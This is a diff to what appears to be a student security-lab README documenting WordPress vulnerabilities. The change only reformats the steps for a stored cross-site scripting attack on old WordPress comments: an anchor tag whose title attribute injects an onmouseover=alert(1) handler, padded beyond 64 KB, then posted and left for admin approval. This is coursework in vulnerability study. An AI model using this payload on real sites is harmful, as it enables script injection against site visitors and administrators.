@@ -27,7 +27,7 @@ Time spent: **X** hours spent in total
   - [x] GIF Walkthrough: <img src="https://raw.githubusercontent.com/cheezm91/CodePathWeek7/master/2XSS.gif" width="800">
   - [x] Steps to recreate: 
     - Comment on post with:
-     <a title='x onmouseover=alert(1) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
+     `<a title='x onmouseover=alert(1) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>`
     - Text must be over 64 kb
     - Wait for admin to approve of comment
 1. (Required) WordPress  3.7-4.4 - Authenticated Cross-Site Scripting (XSS)
